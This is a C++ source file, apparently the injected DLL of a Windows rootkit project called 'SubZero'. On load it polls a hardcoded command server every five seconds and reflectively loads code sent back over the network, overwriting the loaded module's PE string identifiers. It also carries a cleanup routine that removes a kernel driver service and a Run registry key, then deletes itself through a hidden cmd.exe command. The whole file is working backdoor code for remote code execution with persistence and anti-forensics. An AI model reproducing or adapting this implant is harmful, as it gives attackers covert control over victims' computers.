#include "pch.h"
#include "HttpClient.h"
#include "ReflectiveLibraryLoader.h"
#include "../SubZeroDriver/SubZeroCommon.h"
#include "../SubZeroClient/SubZeroLoaderCommon.h"
#include "../SubZeroUtils/RegistryManager.h"
#include "../SubZeroUtils/ServiceManager.h"
#include "../SubZeroUtils/AutoRegistryKeyHandle.h"

const std::string IpAddress = "192.168.14.139";
constexpr DWORD Port = 8080;
constexpr DWORD SecondsBetweenFetches = 5;

BOOL SubZeroCleanup() {	
    try {
    	// Uninstall Subzero driver
        const ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
        serviceManager.stopAndRemove();

    	// Delete registry key
        const AutoRegistryKeyHandle autoRegKey(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
        RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
    }
	catch(std::exception& exception) {
		// TODO: Handle exception accordingly
        return FALSE;
	}

	// Delete files
    if (!(::DeleteFileW(DRIVER_FULL_PATH.c_str())))
        if (::GetLastError() != ERROR_FILE_NOT_FOUND)
            // TODO: Handle exception accordingly
			return FALSE;

    if (!(::DeleteFileW(LOADER_FULL_PATH.c_str())))
        if (::GetLastError() != ERROR_FILE_NOT_FOUND)
            // TODO: Handle exception accordingly
            return FALSE;

	// Delete current DLL file after its process exits        
    WCHAR command[MAX_PATH + 100];    
    DWORD index = swprintf_s(command, MAX_PATH + 100, L"cmd.exe /c timeout 5 > NUL && taskkill /f /PID %d && ", ::GetCurrentProcessId());
    swprintf_s(command + index, MAX_PATH + 100 - index - 1, L"del \"%ws\"", DLL_FULL_PATH.c_str());	
      
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    // Creates a cmd child process
    return ::CreateProcessW(
        nullptr,					// Module
        command,					// Command-line
        nullptr,                    // Process security attributes
        nullptr,                    // Primary thread security attributes
        TRUE,						// Handles are inherited
        CREATE_NO_WINDOW,           // Creation flags
        nullptr,                    // Environment (use parent)
        nullptr,                    // Current directory (use parent)
        &si,                        // STARTUPINFO pointer
        &pi                         // PROCESS_INFORMATION pointer
    );
}

BOOL ResponseHandler(ServerOpcode ServerOC, const PVOID Data, SIZE_T DataLength, std::string* ReturnedData) {
    BOOL success = FALSE;
    PMEMORY_MODULE hModule;

    switch (ServerOC)
    {
    case ServerOpcode::LoadLibraryReflectively:
        hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
        if (hModule) {
            ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
            success = TRUE;
        }       
        break;
    case ServerOpcode::InjectKernelShellcode:
        // TODO
        break;
    case ServerOpcode::Cleanup:
        success = SubZeroCleanup();
        break;    	
    default:
        break;
    }
    return success;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    auto httpClient = new HttpClient(IpAddress, Port, ResponseHandler);
	
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

        // Endless loop, preventing from the APC queue to empty and launch a Chrome window
        for (;;) {
            if (httpClient->FetchFromServer() != httplib::Error::Success) {

            	// Error connecting to server - Try again in 5 seconds
                delete httpClient;
            	httpClient = new HttpClient(IpAddress, Port, ResponseHandler);
            }
        	
            Sleep(SecondsBetweenFetches * 1000);
        }                

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}